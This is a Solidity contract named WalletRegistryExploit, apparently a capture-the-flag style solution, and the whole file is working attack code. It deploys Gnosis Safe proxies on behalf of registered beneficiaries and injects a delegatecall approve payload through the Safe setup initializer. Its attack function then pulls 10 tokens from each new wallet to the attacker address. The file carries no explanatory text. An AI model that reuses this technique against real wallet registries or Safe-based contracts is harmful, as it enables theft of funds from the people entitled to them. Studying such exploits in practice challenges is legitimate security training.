// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

contract WalletRegistryExploit {
    address private immutable exploit = address(this);
    address private immutable attacker;
    address private immutable masterCopy;
    address private immutable walletFactory;
    address private immutable walletRegistry;
    address private immutable token;

    constructor(
        address attackerAddress,
        address masterCopyAddress,
        address walletFactoryAddress,
        address walletRegistryAddress,
        address tokenAddress
    ) {
        attacker = attackerAddress;
        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        walletRegistry = walletRegistryAddress;
        token = tokenAddress;
    }

    function approve() external {
        IERC20(token).approve(exploit, 10 ether);
    }

    function attack(address[] calldata beneficiaries) public {
        require(msg.sender == attacker);

        for (uint8 i = 0; i < beneficiaries.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];

            bytes memory payload = abi.encodeWithSignature("approve()");

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                owners.length,
                exploit,
                payload,
                0,
                0,
                0,
                0
            );

            GnosisSafeProxy proxy = GnosisSafeProxyFactory(walletFactory)
                .createProxyWithCallback(
                    masterCopy,
                    initializer,
                    block.timestamp,
                    IProxyCreationCallback(walletRegistry)
                );

            IERC20(token).transferFrom(address(proxy), attacker, 10 ether);
        }
    }
}
